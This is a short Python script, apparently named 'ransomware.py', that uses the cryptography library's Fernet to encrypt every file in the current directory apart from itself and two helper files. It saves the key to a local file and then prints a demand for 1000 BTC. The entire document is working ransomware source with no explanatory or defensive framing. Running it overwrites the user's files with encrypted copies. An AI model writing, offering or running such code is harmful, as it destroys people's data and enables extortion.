import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
    if file!= 'ransomware.py' and file!='thekey.key' and file!='ransom_decrypt.py':
        files.append(file)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
print("All your files are encrypted. Send 1000 BTC to the address below to get the key.")
